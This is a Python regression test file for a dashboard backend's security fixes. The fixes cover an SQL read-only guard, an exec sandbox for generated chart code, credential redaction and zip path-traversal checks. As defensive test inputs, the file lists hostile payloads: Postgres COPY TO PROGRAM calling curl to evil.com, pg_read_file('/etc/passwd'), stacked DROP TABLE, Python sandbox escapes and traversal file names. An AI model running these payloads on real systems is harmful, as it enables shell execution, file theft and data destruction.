"""Regression checks for the security fixes. Run: python test_backend.py

No pytest, no fixtures — every assertion here fails loudly if one of the
patched holes reopens. Nothing touches a real database or the Gemini API.
"""

import os
import sys

# Runnable as `python tests/test_backend.py` from the repo root.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ.setdefault("CACHE_DB_URL", "postgresql://u:p@localhost:5432/test")
os.environ.setdefault("NVIDIA_API_KEY", "test-key-not-used")

from app.sql_guard import is_read_only
from app.utils import build_charts_zip, get_dialect_name, redact, resolve_db_url, slugify
from app.services.viz import VizService


def test_guardrail_allows_real_queries():
    for q in [
        "SELECT * FROM updates",                                  # 'update' substring
        "SELECT * FROM users WHERE note = 'please delete me'",     # 'delete' in a literal
        "WITH t AS (SELECT 1 AS a) SELECT * FROM t",
        "SELECT a, COUNT(*) FROM sales GROUP BY a ORDER BY 2 DESC LIMIT 10",
        "SELECT * FROM a UNION SELECT * FROM b",
    ]:
        assert is_read_only(q), f"false positive, blocked a valid read: {q}"


def test_guardrail_blocks_bypasses():
    for q in [
        "COPY (SELECT 1) TO PROGRAM 'curl evil.com'",   # postgres shell exec
        "SELECT pg_read_file('/etc/passwd')",           # host file read
        "SELECT lo_import('/etc/passwd')",
        "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)",
        "CREATE TABLE x AS SELECT 1",
        "DO $$ BEGIN PERFORM 1; END $$",
        "SELECT 1; DROP TABLE users",                   # statement stacking
        "WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x",
        "INSERT INTO t VALUES (1)",
        "DROP TABLE users",
        "TRUNCATE users",
        "GRANT ALL ON users TO public",
        "not sql at all (((",
        "",
    ]:
        assert not is_read_only(q), f"BYPASS: guardrail allowed {q!r}"


def test_exec_sandbox_blocks_imports():
    """The RCE fix: exec globals without __builtins__ get the real builtins."""
    g = VizService.safe_exec_globals()
    assert "__builtins__" in g, "missing __builtins__ means Python injects the real ones"
    assert "__import__" in g["__builtins__"], "__import__ must be shadowed, not absent"

    for payload in [
        "import os",
        "__import__('os').system('echo pwned')",
        "open('/etc/passwd').read()",
        "eval('1+1')",
        "exec('x=1')",
        "exit()",
    ]:
        try:
            exec(payload, VizService.safe_exec_globals())
        except Exception:
            continue
        raise AssertionError(f"SANDBOX ESCAPE: {payload!r} executed")


def test_exec_sandbox_still_runs_plotting():
    g = VizService.safe_exec_globals()
    exec("d = pd.DataFrame({'a': [1, 2, 3]}); n = len(d); s = sum([1, 2]); m = max(1, 2)", g)
    assert g["n"] == 3 and g["s"] == 3 and g["m"] == 2, "safelist too tight for real viz code"


def test_dialect_from_scheme_not_substring():
    assert get_dialect_name("postgresql://u:p@h/db") == "postgres"
    assert get_dialect_name("mysql+pymysql://u:p@h/db") == "mysql"
    # A password containing another engine's name used to flip the dialect.
    assert get_dialect_name("postgresql://u:my_oracle_pw@h/db") == "postgres"
    assert get_dialect_name("mysql://u:postgres123@h/db") == "mysql"


def test_redact_strips_credentials():
    msg = "could not connect: postgresql://neondb_owner:npg_secret@ep-x.neon.tech/neondb"
    out = redact(msg)
    assert "npg_secret" not in out and "neondb_owner" not in out, out
    assert "neon.tech" in out, "redaction should keep the host, only drop credentials"


def test_preset_resolution_keeps_password_server_side():
    cache = "postgresql://owner:secret@host.neon.tech/neondb?sslmode=require"
    assert resolve_db_url("preset:analytics", cache).startswith("postgresql://owner:secret@host.neon.tech/analytics")
    # Plain URLs pass through untouched.
    assert resolve_db_url("mysql://a:b@h/x", cache) == "mysql://a:b@h/x"
    sample = "postgresql://demo:pw@demo.neon.tech/neondb"
    assert resolve_db_url("preset:sample", cache, sample) == sample
    try:
        resolve_db_url("preset:sample", cache)
        raise AssertionError("preset:sample resolved without SAMPLE_DB_URL")
    except ValueError:
        pass
    for bad in ["preset:", "preset:a/b", "preset:x@evil.com", "preset:a?x=1"]:
        try:
            resolve_db_url(bad, cache)
        except ValueError:
            continue
        raise AssertionError(f"accepted malformed preset: {bad!r}")


def test_pagination_limit_is_bounded():
    from pydantic import ValidationError
    from app.models import PaginationRequest

    ok = PaginationRequest(db_url="postgresql://u:p@h/db", page=1, limit=100)
    assert ok.limit == 100
    for bad in ({"limit": 10_000_000}, {"limit": 0}, {"limit": -5}, {"page": 0}):
        try:
            PaginationRequest(db_url="postgresql://u:p@h/db", **bad)
        except ValidationError:
            continue
        raise AssertionError(f"accepted out-of-range pagination: {bad}")


def test_ai_service_rejects_empty_keys():
    from app.services.ai import create_ai_service
    bad = [
        dict(api_key="", base_url="https://x/v1", model="m"),
        dict(api_key=None, base_url="https://x/v1", model="m"),
        dict(api_key="k", base_url="https://x/v1", model=""),
    ]
    for kwargs in bad:
        try:
            create_ai_service(**kwargs)
        except ValueError:
            continue
        raise AssertionError(f"AIService accepted empty config: {kwargs}")


def test_json_call_validates_against_schema():
    from app.models import ChartSpec
    from app.services.ai import AIService

    ai = AIService(api_key="k", base_url="https://x/v1", model="m")
    ai._complete = lambda s, u: (
        '```json\n[{"title": "t", "description": "d", "sql_query": "SELECT 1"}]\n```'
    )
    out = ai.gemini_json("plan", "go", response_schema=list[ChartSpec])
    assert out and isinstance(out[0], ChartSpec), out

    ai._complete = lambda s, u: "Sure! Here's a plan."
    assert ai.gemini_json("plan", "go", response_schema=list[ChartSpec]) is None


def test_strip_fences_extracts_embedded_code_block():
    from app.services.ai import AIService

    wrapped = 'Here is the script:\n```python\nx = 1\nplt.savefig(chart_path)\n```'
    assert AIService._strip_fences(wrapped) == "x = 1\nplt.savefig(chart_path)"


def test_prepare_viz_script_drops_imports():
    from app.services.viz import VizService

    script = "import os\nfrom pathlib import Path\nplt.bar([1], [2])\n"
    assert "import" not in VizService._prepare_viz_script(script)
    assert "plt.bar" in VizService._prepare_viz_script(script)


def test_fallback_chart_writes_png():
    import tempfile

    import pandas as pd
    from app.services.viz import VizService

    df = pd.DataFrame({"region": ["north", "south"], "revenue": [10, 20]})
    with tempfile.TemporaryDirectory() as d:
        VizService._fallback_chart(df, d, "Revenue by region")
        assert os.path.isfile(os.path.join(d, "chart.png"))


def test_log_failed_viz_script_does_not_raise():
    from app.services.viz import VizService

    VizService._log_failed_viz_script(
        script="plt.savefig(chart_path)\n",
        error=ValueError("EXEC SECURITY"),
        query="Revenue by Country",
        attempt=1,
        columns=["country", "revenue"],
    )


def _fake_dashboard_env(sql_by_title, repair_sql="", slow_titles=(), delay=0.6):
    """Builder wired to a stub AI + a real sqlite DB, so no API key is needed."""
    import sqlite3, tempfile as tf
    from app.services.dashboard import DashboardBuilder
    from app.services.database import DatabaseManager

    d = tf.mkdtemp()
    dbf = os.path.join(d, "d.db")
    c = sqlite3.connect(dbf)
    c.execute("CREATE TABLE sales (region TEXT, amt REAL)")
    c.executemany("INSERT INTO sales VALUES (?,?)",
                  [("north", 10.0), ("south", 20.0), ("east", 30.0)])
    c.commit(); c.close()

    state = {"fixes": 0, "viz_calls": 0}

    class FakeAI:
        def gemini_json(self, system, user, response_schema):
            return [{"title": t, "description": f"{t} desc", "sql_query": q}
                    for t, q in sql_by_title.items()]

        def validate_sql_safety(self, sql, safe_mode, dialect="postgres"):
            from app.sql_guard import is_read_only
            return is_read_only(sql, "sqlite")

        def fix_sql(self, sql, err, schema, dialect):
            state["fixes"] += 1
            return repair_sql  # "" means the repair attempt itself failed

        def gemini_call(self, system, user):
            state["viz_calls"] += 1
            # Stall the named panels so completion order can't match plan order.
            if any(t in system for t in slow_titles):
                import time
                time.sleep(delay)
            # A minimal valid chart script for the sandbox.
            return (
                "plt.figure()\n"
                "plt.bar(df[df.columns[0]].astype(str), df[df.columns[1]])\n"
                "plt.savefig(chart_path)\n"
            )

    return DashboardBuilder(FakeAI(), DatabaseManager()), f"sqlite:///{dbf}", state


def test_dashboard_reports_failures_instead_of_dropping_panels():
    builder, url, _ = _fake_dashboard_env({
        "Good": "SELECT region, SUM(amt) AS revenue FROM sales GROUP BY region",
        "Bad table": "SELECT * FROM does_not_exist",
        "Not read-only": "DROP TABLE sales",
        "Empty": "SELECT region, SUM(amt) AS r FROM sales WHERE region='nowhere' GROUP BY region",
    })
    res = builder.build(url, "sqlite", "Table: sales", "")

    assert len(res.charts) == 1, f"expected 1 chart, got {len(res.charts)}"
    assert res.charts[0].title == "Good"
    assert res.error is None
    assert res.charts[0].graph_base64, "chart has no image data"
    assert res.charts[0].sql_query, "chart should report the SQL it ran"

    # The three broken panels must be explained, not silently dropped.
    reasons = {f.title: f.reason for f in res.failed}
    assert len(reasons) == 3, reasons
    assert "read-only" in reasons["Not read-only"].lower(), reasons
    assert "no rows" in reasons["Empty"].lower(), reasons


def test_dashboard_repairs_broken_sql_once():
    builder, url, state = _fake_dashboard_env(
        {"Fixable": "SELECT bogus FROM sales"},
        repair_sql="SELECT region, SUM(amt) AS revenue FROM sales GROUP BY region",
    )
    res = builder.build(url, "sqlite", "Table: sales", "")
    assert state["fixes"] == 1, f"expected exactly one repair attempt, got {state['fixes']}"
    assert len(res.charts) == 1, f"repair should have produced a chart: {res.failed}"


def test_dashboard_preserves_planned_order():
    specs = {f"Panel {i}": f"SELECT region, SUM(amt)+{i} AS revenue FROM sales GROUP BY region"
             for i in range(4)}
    builder, url, _ = _fake_dashboard_env(specs)
    res = builder.build(url, "sqlite", "Table: sales", "")
    assert [c.title for c in res.charts] == list(specs), \
        f"parallel build reordered panels: {[c.title for c in res.charts]}"


def _sick_db():
    """A sqlite database with one of each defect the checker looks for."""
    import sqlite3, tempfile as tf
    d = tf.mkdtemp()
    dbf = os.path.join(d, "sick.db")
    c = sqlite3.connect(dbf)
    c.executescript("""
        CREATE TABLE customers (id INTEGER PRIMARY KEY, email TEXT, region TEXT);
        CREATE TABLE orders (
            id INTEGER PRIMARY KEY, customer_id INTEGER, amount REAL,
            placed_at DATE, notes TEXT, legacy_flag TEXT,
            FOREIGN KEY (customer_id) REFERENCES customers (id)
        );
        CREATE TABLE audit_log (id INTEGER PRIMARY KEY, msg TEXT);
    """)
    c.executemany("INSERT INTO customers VALUES (?,?,?)",
                  [(i, "dup@x.com" if i < 3 else f"u{i}@x.com", "north")
                   for i in range(1, 31)])
    c.executemany("INSERT INTO orders VALUES (?,?,?,?,?,?)",
                  [(i,
                    999 if i == 1 else (i % 30) + 1,      # 1 orphan
                    -5.0 if i == 2 else 10.0,             # negative amount
                    "1799-01-01" if i == 3 else "2024-06-01",  # implausible date
                    "" if i < 5 else None,                # empty strings + nulls
                    None)                                 # entirely null
                   for i in range(1, 41)])
    c.commit(); c.close()
    return f"sqlite:///{dbf}"


def _run_health():
    from app.services.database import DatabaseManager
    from app.services.health import HealthChecker
    return HealthChecker(DatabaseManager()).run(_sick_db(), "sqlite")


def test_health_finds_every_planted_defect():
    report = _run_health()
    assert report.error is None, report.error
    found = {(f.table, f.column, f.issue) for f in report.findings}

    expected = [
        ("audit_log", None, "Empty table"),
        ("orders", "customer_id", "Orphaned foreign key"),
        ("customers", "email", "Duplicate values in a key-like column"),
        ("orders", "legacy_flag", "Column is entirely null"),
        ("orders", "notes", "Empty strings used as null"),
        ("orders", "amount", "Negative quantity"),
        ("orders", "placed_at", "Implausible date"),
        ("customers", "region", "Single value"),
    ]
    for want in expected:
        assert want in found, f"missed {want}; got {sorted(found)}"


def test_health_ranks_worst_first_and_scores_down():
    report = _run_health()
    order = [f.severity for f in report.findings]
    rank = {"high": 0, "medium": 1, "low": 2}
    assert order == sorted(order, key=lambda s: rank[s]), order
    assert report.score < 100, "a database this broken should not score 100"
    assert report.tables_checked == 3, report.tables_checked


def test_health_clean_db_reports_nothing():
    """The checker must not invent findings — a false positive here makes the
    whole page noise."""
    import sqlite3, tempfile as tf
    from app.services.database import DatabaseManager
    from app.services.health import HealthChecker

    d = tf.mkdtemp()
    dbf = os.path.join(d, "clean.db")
    c = sqlite3.connect(dbf)
    c.execute("CREATE TABLE t (id INTEGER PRIMARY KEY, label TEXT, qty REAL)")
    c.executemany("INSERT INTO t VALUES (?,?,?)",
                  [(i, f"label-{i}", float(i)) for i in range(1, 31)])
    c.commit(); c.close()

    report = HealthChecker(DatabaseManager()).run(f"sqlite:///{dbf}", "sqlite")
    assert report.findings == [], [f.detail for f in report.findings]
    assert report.score == 100


def test_stream_yields_panels_as_they_finish():
    """The point of the stream: a fast panel must not wait on a slow one."""
    specs = {f"Panel {i}": "SELECT region, SUM(amt) AS revenue FROM sales GROUP BY region"
             for i in range(4)}
    builder, url, _ = _fake_dashboard_env(specs, slow_titles=("Panel 0",))

    frames = list(builder.iter_panels(url, "sqlite", "Table: sales", ""))

    assert frames[0][0] == "plan", f"plan must arrive first, got {frames[0][0]}"
    assert len(frames[0][2]) == 4

    charts = [(kind, index) for kind, index, _ in frames if kind == "chart"]
    assert len(charts) == 4, charts
    # Panel 0 was stalled, so it cannot be the first one out.
    assert charts[0][1] != 0, f"stream waited on the slow panel: {charts}"
    assert charts[-1][1] == 0, f"slow panel should land last: {charts}"


def test_stream_reports_failures_as_frames():
    builder, url, _ = _fake_dashboard_env({
        "Good": "SELECT region, SUM(amt) AS revenue FROM sales GROUP BY region",
        "Not read-only": "DROP TABLE sales",
    })
    kinds = [k for k, _, _ in builder.iter_panels(url, "sqlite", "Table: sales", "")]
    assert kinds.count("chart") == 1, kinds
    assert kinds.count("failed") == 1, kinds


def test_build_still_returns_planned_order_over_the_generator():
    """build() now drains iter_panels; completion order must not leak into it."""
    specs = {f"Panel {i}": "SELECT region, SUM(amt) AS revenue FROM sales GROUP BY region"
             for i in range(4)}
    builder, url, _ = _fake_dashboard_env(specs, slow_titles=("Panel 0",))
    res = builder.build(url, "sqlite", "Table: sales", "")
    assert [c.title for c in res.charts] == list(specs), [c.title for c in res.charts]


def _png_b64(seed=b"x"):
    """A real, minimal PNG — the zip builder checks magic bytes."""
    import base64, zlib, struct
    def chunk(tag, data):
        c = tag + data
        return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c))
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00" + seed * 3)
    png = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
    return base64.b64encode(png).decode()


class _Chart:
    def __init__(self, title, description, graph_base64):
        self.title, self.description, self.graph_base64 = title, description, graph_base64


def test_zip_holds_a_png_and_a_txt_per_chart():
    import io, zipfile
    charts = [_Chart("Revenue peaked in Q3", "Month over month.", _png_b64()),
              _Chart("Orders by region", "Top regions.", _png_b64(b"y"))]
    zf = zipfile.ZipFile(io.BytesIO(build_charts_zip(charts)))

    assert zf.namelist() == [
        "01-revenue-peaked-in-q3.png", "01-revenue-peaked-in-q3.txt",
        "02-orders-by-region.png", "02-orders-by-region.txt",
    ], zf.namelist()
    assert zf.read("01-revenue-peaked-in-q3.png").startswith(b"\x89PNG"), "png corrupted"
    assert zf.read("01-revenue-peaked-in-q3.txt").decode() == \
        "Revenue peaked in Q3\n\nMonth over month.\n"
    assert zf.testzip() is None, "archive is corrupt"


def test_zip_entry_names_cannot_escape_the_archive():
    """Chart titles are model-written; a title must never become a path."""
    import io, zipfile
    for title in ["../../etc/passwd", "/abs/path", "..\\..\\win.ini", "a/b/c"]:
        names = zipfile.ZipFile(io.BytesIO(
            build_charts_zip([_Chart(title, "d", _png_b64())]))).namelist()
        for name in names:
            assert "/" not in name and "\\" not in name, f"path leaked through: {name}"
            assert ".." not in name, f"traversal leaked through: {name}"


def test_zip_keeps_duplicate_titles_apart():
    import io, zipfile
    charts = [_Chart("Same", "one", _png_b64()), _Chart("Same", "two", _png_b64())]
    zf = zipfile.ZipFile(io.BytesIO(build_charts_zip(charts)))
    assert len(set(zf.namelist())) == 4, zf.namelist()
    assert zf.read("01-same.txt").decode().endswith("one\n")
    assert zf.read("02-same.txt").decode().endswith("two\n")


def test_zip_rejects_junk_images():
    import base64
    for bad, why in [
        ("not!base64!", "non-base64"),
        (base64.b64encode(b"GIF89a and friends").decode(), "not a PNG"),
        (base64.b64encode(b"<svg onload=alert(1)>").decode(), "svg, not a PNG"),
    ]:
        try:
            build_charts_zip([_Chart("t", "d", bad)])
            raise AssertionError(f"accepted {why}: {bad[:30]}")
        except ValueError:
            pass


def test_slugify_matches_the_frontend_rules():
    assert slugify("Revenue peaked in Q3!") == "revenue-peaked-in-q3"
    assert slugify("") == "chart"
    assert slugify("   ***   ") == "chart"
    assert slugify(None) == "chart"
    assert not slugify("x" * 200 + " tail").endswith("-")
    assert len(slugify("x" * 200)) == 60


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for t in tests:
        t()
        print(f"  ok  {t.__name__}")
    print(f"\n{len(tests)} checks passed.")
